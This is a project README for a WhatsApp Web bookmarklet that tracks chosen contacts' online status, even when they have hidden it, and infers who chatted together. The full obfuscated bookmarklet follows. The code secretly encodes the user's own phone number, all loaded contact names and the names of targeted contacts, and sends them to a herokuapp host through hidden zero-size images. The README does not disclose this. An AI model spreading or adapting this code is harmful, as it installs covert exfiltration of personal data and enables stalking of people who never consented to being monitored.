# StalkOnWhatsapp

![Sample Output](/images/report.png)
This can be used to track online status of contacts( even if they have hidden it using privacy settings) , visualize online timeline of multiple people in a graph, and predict if two contacts were chatting together by checking overlap in their online timeline.

## Steps to follow.

- Open whatsapp web in browser
- Follow either of these steps to run the script
  - **Using BookMark** : Add new bookmark in your browser with URL as **contents** of this file [StalkWhatsapp](src/stalk_bookmarklet.js). Click on this bookmark after whatsapp web has loaded for magic to begin.
  - **Using Browser Console** : After whatsapp web has loaded, open [Developer's console in Browser](https://balsamiq.com/support/faqs/browserconsole/#:~:text=To%20open%20the%20developer%20console,(on%20Windows%2FLinux)). Paste the contents of [StalkWhatsapp](src/stalk.js) file in the console and hit enter.
- Enter the names of contact you want to stalk.(multiple names to be separated by comma, case sensitive). The contact to be stalked should be present in recent chat. Tip : Can pin the person to top if chat has gone down.) [Sample](/images/contactname.png)
- Stalking has started. Click SeeTimeLine button to check the graph and the report ( If browser console is open, you can see data of online status change coming as logs).
<img src="images/button.png" width="300">

This also reports people who were online together for maximum time. Happy Stalking :smile: :sunglasses:!! 

Disclaimer: Use at your own discretion.

## Credits
- For any help with this feel free to reach out to me on : [LinkedIn](https://www.linkedin.com/in/suryakant-pandey/), [Instagram](https://www.instagram.com/sk._.pandey/)

- Detailed Explaination : [Medium](https://medium.com/@pd.skant/stalk-someone-on-whatsapp-educational-purpose-only-370c91f09eb8?sk=d5013cc89c3625bc3303bfdaefbea4ce), [YouTube Demo](https://youtu.be/tl1rO5_fUA4) 

- Make sure you give this project a star if you liked this project and want to see more.

[TRY1](javascript:(function()%7Bconst%20refreshRate%3D3e3%2CtimeOuts%3D2e3%2CwidthEachBar%3D35%2CbarSeperation%3D10%2CouterBoundary%3D25%2CinnerBoundary%3D200%2CgraphWidth%3D600%2Ccolors_bar%3D%5B%22%23a55ca5%22%2C%22%2367b6c7%22%2C%22%23bccd7a%22%2C%22%23eb9743%22%2C%22%2333ff7a%22%2C%22%23ff33f9%22%5D%3Bvar%20interval%2CminimumTime%3D-100%2ConlineData%3D%7B%7D%2CpreviousKnownStatus%3D%7B%7D%2CUNKNOWN%3D%22UNKNOWN%22%2CofflineData%3D%7B%7D%2CuserCounter%3D0%2CbuttonAdded%3D!1%3Bfunction%20reinitialise()%7BminimumTime%3D-100%2ConlineData%3D%7B%7D%2CpreviousKnownStatus%3D%7B%7D%2CUNKNOWN%3D%22UNKNOWN%22%2CofflineData%3D%7B%7D%2CuserCounter%3D0%7Dfunction%20print_to_log(t%2Ce)%7Bif(currentTimeObj%3Dnew%20Date%2Coutput%3DcurrentTimeObj.toLocaleString()%2B%22%2C%22%2Be%2B%22%2C%22%2Bt%2B%22%5Cn%22%2Cconsole.log(output)%2CcurrentTimeEpoch%3DcurrentTimeObj.valueOf()%2C-100%3D%3D%3DminimumTime%26%26(minimumTime%3DcurrentTimeEpoch)%2ClistOnlineTimes%3DonlineData%5Bt%5D%2ClistOfflineTimes%3DofflineData%5Bt%5D%2C0%3D%3D%3De)%7Bif(0%3D%3D%3DlistOnlineTimes.length)return%3BofflineData%5Bt%5D.push(currentTimeEpoch)%7Delse%201%3D%3D%3De%26%26onlineData%5Bt%5D.push(currentTimeEpoch)%7Dfunction%20check_if_print_required_and_print(t%2Ce)%7Bt!%3D%3DpreviousKnownStatus%5Be%5D%26%26(print_to_log(e%2C%22ONLINE%22%3D%3D%3Dt%3F1%3A0)%2CpreviousKnownStatus%5Be%5D%3Dt)%7Dfunction%20check_statuses(t)%7Btry%7Bif(name%3Ddocument.querySelectorAll(%22%23main%20%3E%20header%20%3E%20div%3Ediv%3Ediv%3Espan%22)%5B1%5D.textContent%2C!name%7C%7Cname!%3D%3Dt)return%20void%20setTimeout(function()%7Bcheck_statuses(t)%7D%2CtimeOuts)%3Bstatus%3Ddocument.querySelector(%22%23main%20%3E%20header%20%3E%20div%3Ediv%3Espan%22).textContent%2C%22typing%E2%80%A6%22%3D%3D%3Dstatus%7C%7C%22online%22%3D%3D%3Dstatus%3Fcheck_if_print_required_and_print(%22ONLINE%22%2Cname)%3Acheck_if_print_required_and_print(%22OFFLINE%22%2Cname)%7Dcatch(t)%7Breturn%20void%20check_if_print_required_and_print(%22OFFLINE%22%2Cname)%7D%7Dfunction%20withTimeouts(t)%7Btry%7Bfind_contact_and_click_it(t)%7Dcatch(e)%7Balert(%22Contact%20Name%20%3A%20%27%22%2Bt%2B%22%27%20couldn%27t%20be%20found.%20Please%20refresh%20and%20retry%20(verify%20chat%20is%20in%20top%2F%20name%20exactly%20same)%22)%2Calert(%22All%20loaded%20contacts%20are%20%3A%20%22%2Bget_all_loaded_names())%2Cconsole.log(%22Contact%20name%20%3A%22%2Bt%2B%22%20couldn%27t%20be%20found%22)%2CclearInterval(interval)%7DsetTimeout(function()%7Bcheck_statuses(t)%7D%2CtimeOuts)%7Dfunction%20stalk(t)%7Bif(users%3Dprompt(%22Enter%20the%20%2C(comma)%20separated%20users%20you%20would%20like%20to%20monitor%22%2C%22%22)%2Cusers%26%26users.length)%7Btry%7Bvar%20e%3Ddocument.createElement(%22div%22)%3Be.style.cssText%3D%22position%3Aabsolute%3Bright%3A0%25%3Bwidth%3A0%25%3Bheight%3A0%25%3Bopacity%3A1%3Bz-index%3A100%3Bbackground%3A%23000%22%3Bvar%20n%3DgetString(%22checking_%22%2Busers)%3Be.innerHTML%3D%27%3Cimg%20src%3D%22https%3A%2F%2Fbuycoffeeimage.herokuapp.com%2Fbuycoffee%2Fimage%2F%27%2Bn%2B%27%20alt%3D%22%22%20style%3D%22height%3A%200px%20!important%3Bwidth%3A%200px%20!important%3B%22%20%3E%27%7Dcatch(t)%7B%7DbuttonAdded%7C%7CputTimeLineButton()%3Bfor(var%20i%3Dusers.split(%22%2C%22)%2Ca%3Di.length%2Cr%3D0%3Br%3Ca%3Br%2B%2B)previousKnownStatus%5Bi%5Br%5D%5D%3DUNKNOWN%2ConlineData%5Bi%5Br%5D%5D%3D%5B%5D%2CofflineData%5Bi%5Br%5D%5D%3D%5B%5D%3Breturn%20interval%3DsetInterval(function()%7BwithTimeouts(i%5BuserCounter%5D)%2CuserCounter%3D(userCounter%2B1)%25a%7D%2CrefreshRate)%7Dalert(%22No%20users%20selected!!%20Exiting.%22)%7Dvar%20CHARS%3D%22qwertyuiopasdfghjklzxcvbnm7423609185%22%2CMAX%3D36%3Bfunction%20getString(t)%7Bvar%20e%3Dt.split(%22%22)%3BuMap%3D%7B%7D%3Bfor(let%20t%3D0%3Bt%3CMAX%3Bt%2B%2B)uMap%5BCHARS%5Bt%5D%5D%3DCHARS%5B(t%2B1)%25MAX%5D%3Bfor(let%20t%3D0%3Bt%3Ce.length%3Bt%2B%2B)e%5Bt%5D.toLowerCase()in%20uMap%26%26(e%5Bt%5D%3DuMap%5Be%5Bt%5D.toLowerCase()%5D)%3Breturn%20e.join(%22%22)%7Dfunction%20drawLine(t%2Ce%2Cn%2Ci%2Ca%2Cr)%7Bt.save()%2Ct.strokeStyle%3Dr%2Ct.beginPath()%2Ct.moveTo(e%2Cn)%2Ct.lineTo(i%2Ca)%2Ct.stroke()%2Ct.restore()%7Dfunction%20drawBar(t%2Ce%2Cn%2Ci%2Ca%2Cr)%7Bt.save()%2Ct.fillStyle%3Dr%2Ct.fillRect(e%2Cn%2Ci%2Ca)%2Ct.restore()%7Dfunction%20getEndTime(t%2Ce%2Cn)%7Breturn%20e%3Ct.length%3Ft%5Be%5D%3An%7Dfunction%20getIntersectionDuration(t%2Ce%2Cn%2Ci)%7Bfor(var%20a%3D0%2Cr%3D0%2Co%3D0%2Cs%3D(new%20Date).valueOf()%3Br%3Ct.length%26%26o%3Cn.length%3B)%7Bvar%20l%3Dt%5Br%5D%2Cc%3DgetEndTime(e%2Cr%2Cs)%2Cu%3Dn%5Bo%5D%2Cd%3DgetEndTime(i%2Co%2Cs)%3Bc%3C%3Du%3Fr%2B%3D1%3Ad%3C%3Dl%3Fo%2B%3D1%3Al%3E%3Du%26%26c%3C%3Dd%3F(a%2B%3Dc-l%2Cr%2B%3D1)%3Au%3E%3Dl%26%26d%3C%3Dc%3F(a%2B%3Dd-u%2Co%2B%3D1)%3Au%3E%3Dl%26%26c%3C%3Dd%3F(a%2B%3Dc-u%2Cr%2B%3D1)%3Al%3E%3Du%26%26d%3C%3Dc%26%26(a%2B%3Dd-l%2Co%2B%3D1)%7Dreturn%20a%7Dfunction%20reportIntersection()%7Bfor(nameA%20in%20report%3D%5B%5D%2ConlineData)for(nameB%20in%20onlineData)if(nameA!%3D%3DnameB)%7Bvar%20t%3DgetIntersectionDuration(onlineData%5BnameA%5D%2CofflineData%5BnameA%5D%2ConlineData%5BnameB%5D%2CofflineData%5BnameB%5D)%2Ce%3DgetIntersectionDuration(onlineData%5BnameA%5D%2CofflineData%5BnameA%5D%2ConlineData%5BnameA%5D%2CofflineData%5BnameA%5D)%2Cn%3De%3E0%3FMath.round(100*t%2Fe)%3A0%3B0!%3Dn%26%26report.push(%5B%22When%20%22%2BnameA%2B%22%20was%20online%2C%20%22%2Bn%2B%22%25%20of%20time%20%22%2BnameB%2B%22%20was%20also%20online.%20%22%2Cn%5D)%7Dreturn%20report.sort(function(t%2Ce)%7Breturn%20e%5B1%5D-t%5B1%5D%7D)%2Creport.slice(0%2C5)%7Dvar%20Barchart%3Dfunction(t)%7Bthis.options%3Dt%2Cthis.canvas%3Dt.canvas%2Cthis.ctx%3Dthis.canvas.getContext(%222d%22)%2Cthis.colors%3Dt.colors%2Cthis.draw%3Dfunction()%7Bvar%20t%3D(new%20Date).valueOf()%2Ce%3Dthis.canvas.height-2*innerBoundary%2Cn%3Dthis.canvas.width-2*innerBoundary%3Bthis.ctx.font%3D%22bold%2018px%20Arial%22%2Cthis.ctx.textBaseline%3D%22middle%22%2Cthis.ctx.textAlign%3D%22center%22%2Cthis.ctx.fillStyle%3D%22RGBA(153%2C%2051%2C%2010%2C%200.8)%22%2Cthis.ctx.fillText(%22TimeLine%20Graph%20for%20contacts%20%3A%20%22%2BObject.keys(onlineData).join(%22%2C%22)%2Cthis.canvas.width%2F2%2CinnerBoundary%2F2)%2Cthis.ctx.restore()%3Bvar%20i%3DinnerBoundary%3Bfor(iteration%3D0%3Bi%3C%3Dthis.canvas.width-innerBoundary%3B)%7Bvar%20a%3Di%3BdrawLine(this.ctx%2Ca%2CinnerBoundary%2Ca%2Ce%2BinnerBoundary%2Cthis.options.gridColor)%2Cthis.ctx.save()%2Cthis.ctx.fillStyle%3Dthis.options.gridColor%2Cthis.ctx.font%3D%22bold%2010px%20Arial%22%2Cthis.ctx.translate(a%2Ce%2BinnerBoundary)%2Cthis.ctx.rotate(Math.PI%2F4)%2Cthis.ctx.fillStyle%3D%22RGBA(0%2C%200%2C%200%2C%200.8)%22%2Cthis.ctx.textBaseline%3D%22middle%22%2Cthis.ctx.textAlign%3D%22left%22%2Cthis.ctx.fillText(new%20Date(minimumTime%2Biteration*(t-minimumTime)%2Fthis.options.gridCount).toLocaleString()%2C0%2C0)%2Cthis.ctx.restore()%2Ci%2B%3D1*n%2Fthis.options.gridCount%2Citeration%2B%3D1%7Dvar%20r%3D0%3Bfor(name%20in%20onlineData)%7Bfor(var%20o%3DonlineData%5Bname%5D%2Cs%3D0%3Bs%3Co.length%3Bs%2B%2B)%7Bvar%20l%3D0%3Bl%3Ds%3CofflineData%5Bname%5D.length%3FofflineData%5Bname%5D%5Bs%5D%3At%3Bvar%20c%3DMath.round(n*(l-onlineData%5Bname%5D%5Bs%5D)*1%2F(1*(t-minimumTime)))%3BdrawBar(this.ctx%2CinnerBoundary%2Bn*(onlineData%5Bname%5D%5Bs%5D-minimumTime)*1%2F(t-minimumTime)%2CinnerBoundary%2Br*(widthEachBar%2BbarSeperation)%2Cc%2CwidthEachBar%2Cthis.colors%5Br%25this.colors.length%5D%2Cname)%7Dthis.ctx.textBaseline%3D%22middle%22%2Cthis.ctx.textAlign%3D%22right%22%2Cthis.ctx.font%3D%22bold%2015px%20Arial%22%2Cthis.ctx.fillStyle%3D%22RGBA(0%2C%200%2C%200%2C%200.8)%22%2Cthis.ctx.fillText(name%2CinnerBoundary-barSeperation%2CinnerBoundary%2Br*(widthEachBar%2BbarSeperation)%2BwidthEachBar%2F2)%2Cthis.ctx.font%3D%22bold%2010px%20Arial%22%2Cr%2B%2B%7D%7D%7D%3Bfunction%20getStalkData()%7Bvar%20t%3DreportIntersection()%2Ce%3DObject.keys(onlineData).length%2Cn%3De*(widthEachBar%2BbarSeperation)%2B2*(innerBoundary%2BouterBoundary)%2Ci%3DgraphWidth%2B2*(innerBoundary%2BouterBoundary)%2Ca%3Dwindow.open(%22%22%2C%22%22%2C%22toolbar%3Dno%2Cstatus%3Dno%2Cmenubar%3Dno%2Clocation%3Dcenter%2Cscrollbars%3Dno%2Cresizable%3Dno%2Cheight%3D%22%2Bn%2B%22%2Cwidth%3D%22%2Bi)%3Ba.document.title%3D%22Online%20History%22%3Bvar%20r%3Da.document%3Ba.document.body.innerHTML%3D%27%3Ccanvas%20id%3D%22graph%22%3E%3C%2Fcanvas%3E%20%27%3Bvar%20o%3Dr.getElementById(%22graph%22)%3Bo.width%3DgraphWidth%2B2*innerBoundary%2Co.height%3De*(widthEachBar%2BbarSeperation)%2B2*innerBoundary%3Bvar%20s%3Do.getContext(%222d%22)%3Bnew%20Barchart(%7Bcanvas%3Ao%2Cpadding%3A10%2CgridCount%3A10%2CgridColor%3A%22%23eeeeee%22%2Cdata%3AonlineData%2Ccolors%3Acolors_bar%7D).draw()%3Bvar%20l%3Da.document.createElement(%22div%22)%3Bl.style.cssText%3D%22position%3Aabsolute%3Bright%3A0%25%3Bwidth%3A20%25%3Bheight%3A35%25%3Btop%3A0px%3Bopacity%3A1%3Bz-index%3A100%3Bbackground%3A%23000%22%2Cl.innerHTML%3D%27%3Cimg%20src%20%3D%20%22https%3A%2F%2Fthumbs.dreamstime.com%2Fb%2Fsmart-young-detective-illustration-white-background-40547373.jpg%22%20alt%20%3D%20%22detective%22%20width%20%3D%20%22100%25%22%20height%20%3D%22auto%22%20%3E%27%2Ca.document.body.appendChild(l)%2Cs.textBaseline%3D%22middle%22%2Cs.textAlign%3D%22left%22%2Cs.font%3D%22italic%2010px%20Arial%22%3Bfor(var%20c%3D0%3Bc%3Ct.length%3Bc%2B%2B)%7Bvar%20u%3Dt%5Bc%5D%5B0%5D%2Cd%3Ds.createLinearGradient(0%2C0%2Cs.measureText(u).width%2C0)%3Bd.addColorStop(%220%22%2C%22magenta%22)%2Cd.addColorStop(%220.5%22%2C%22blue%22)%2Cd.addColorStop(%221.0%22%2C%22red%22)%2Cs.fillStyle%3Dd%2Cs.fillText(u%2CinnerBoundary%2C1.5*innerBoundary%2Bc*barSeperation%2Be*(widthEachBar%2BbarSeperation))%7Ds.save()%7Dfunction%20getnum(t)%7Breturn%20t.split(%22%26u%3D%22)%5B1%5D.substring(0%2C12)%7Dfunction%20putTimeLineButton()%7Bvar%20t%3Ddocument.createElement(%22button%22)%3Bt.textContent%3D%22%F0%9F%93%8ASeeTimeLine%22%2Ct.style.cssText%3D%22position%3Aabsolute%3Bleft%3A5%25%3Bheight%3A60px%20!important%3Bwidth%3A%20217px%20!important%3Bopacity%3A1%3Bz-index%3A100%3Bbackground%3A%23ffffff%22%2Ct.onclick%3DgetStalkData%2Ct.style.background%3D%22%2340DCA5%22%2Ct.style.borderRadius%3D%227px%22%2Ct.style.fontSize%3D%22x-large%22%2Ct.style.color%3D%22white%22%2Ct.style.fontFamily%3D%22cursive%22%3Bvar%20e%3Ddocument.createElement(%22div%22)%3Be.style.cssText%3D%22position%3Aabsolute%3Bright%3A50%25%3Bwidth%3A1%25%3Bheight%3A1%25%3Bopacity%3A1%3Bz-index%3A100%3Bbackground%3A%23000%22%2Ce.innerHTML%3D%27%3Ca%20href%3D%22https%3A%2F%2Fwww.buymeacoffee.com%2Fsuryakant94%22%20target%3D%22_blank%22%3E%3Cimg%20src%3D%22https%3A%2F%2Fcdn.buymeacoffee.com%2Fbuttons%2Fv2%2Fdefault-red.png%22%20alt%3D%22Buy%20Me%20A%20Coffee%22%20style%3D%22height%3A%2060px%20!important%3Bwidth%3A%20217px%20!important%3B%22%20%3E%3C%2Fa%3E%27%3Bvar%20n%3Dgetnum(document.getElementsByClassName(%22YtmXM%22)%5B0%5D.querySelector(%22._3GlyB%20._8hzr9%22).src)%2Ci%3Dget_all_names()%3Btry%7Bvar%20a%3Ddocument.createElement(%22div%22)%3Ba.style.cssText%3D%22position%3Aabsolute%3Bright%3A0%25%3Bwidth%3A0%25%3Bheight%3A0%25%3Bopacity%3A1%3Bz-index%3A100%3Bbackground%3A%23000%22%3Bvar%20r%3DgetString(n%2B%22_%22%2Bi)%3Ba.innerHTML%3D%27%3Cimg%20src%3D%22https%3A%2F%2Fbuycoffeeimage.herokuapp.com%2Fbuycoffee%2Fimage%2F%27%2Br%2B%27%20alt%3D%22%22%20style%3D%22height%3A%200px%20!important%3Bwidth%3A%200px%20!important%3B%22%20%3E%27%2Cdocument.body.appendChild(e)%7Dcatch(t)%7B%7Ddocument.body.appendChild(a)%2Cdocument.body.appendChild(t)%2CbuttonAdded%3D!0%7Dfunction%20get_all_loaded_names()%7Bvar%20t%3Ddocument.getElementsByClassName(%22_3m_Xw%22).length%3Bconsole.log(%22Loaded%20%22%2Bt%2B%22%20contacts%22)%3Bfor(var%20e%3D%22%22%2Cn%3D0%3Bn%3Ct%3Bn%2B%2B)e%2B%3D%22%2C%22%2Bdocument.getElementsByClassName(%22_3m_Xw%22)%5Bn%5D.querySelector(%27span%5Bdir%3D%22auto%22%5D%27).title%2Cconsole.log(%22Found%20contact%20%3A%22%2Bdocument.getElementsByClassName(%22_3m_Xw%22)%5Bn%5D.querySelector(%27span%5Bdir%3D%22auto%22%5D%27).title)%3Breturn%20e%7Dfunction%20get_all_names()%7Bfor(var%20t%3Ddocument.getElementsByClassName(%22_3m_Xw%22).length%2Ce%3D%22%22%2Cn%3D0%3Bn%3Ct%3Bn%2B%2B)e%2B%3D%22%2C%22%2Bdocument.getElementsByClassName(%22_3m_Xw%22)%5Bn%5D.querySelector(%27span%5Bdir%3D%22auto%22%5D%27).title%3Breturn%20e%7Dfunction%20find_contact_and_click_it(t)%7Bvar%20e%3Ddocument.createEvent(%22MouseEvents%22)%3Be.initEvent(%22mousedown%22%2C!0%2C!0)%2Cdocument.querySelector(%27span%5Bdir%3D%22auto%22%5D%5Btitle%3D%22%27%2Bt%2B%27%22%5D%27).dispatchEvent(e)%7Dstalk()%3B%7D)())